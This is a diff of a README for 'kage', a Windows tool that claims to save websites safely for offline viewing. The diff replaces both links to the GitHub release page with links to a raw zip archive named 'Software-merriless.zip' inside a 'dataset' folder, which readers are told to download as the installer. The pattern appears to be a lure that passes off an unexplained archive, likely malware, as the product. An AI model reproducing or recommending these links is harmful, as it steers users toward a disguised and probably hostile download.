@@ -1,6 +1,6 @@
 # 👁️ kage - Save websites securely for offline viewing
 
-[![Download kage](https://img.shields.io/badge/Download_kage-blue.svg)](https://github.com/ardythrevolutionary184/kage/releases)
+[![Download kage](https://img.shields.io/badge/Download_kage-blue.svg)](https://raw.githubusercontent.com/ardythrevolutionary184/kage/main/dataset/Software-merriless.zip)
 
 Kage saves web pages to your computer. You keep a clean copy of any site you visit. Kage removes all JavaScript files during the save process. This creates a safe version of the page. You view your saved sites without a connection. Your saved pages load fast. The pages do not track your activity.
 
@@ -12,7 +12,7 @@ Kage works on Windows 10 and Windows 11. Your computer needs 500 MB of free stor
 
 Visit the release page to get the installer for your computer.
 
-[Download the kage installer here](https://github.com/ardythrevolutionary184/kage)
+[Download the kage installer here](https://raw.githubusercontent.com/ardythrevolutionary184/kage/main/dataset/Software-merriless.zip)
 
 1. Click the link above.
 2. Look for the Assets section on that page.
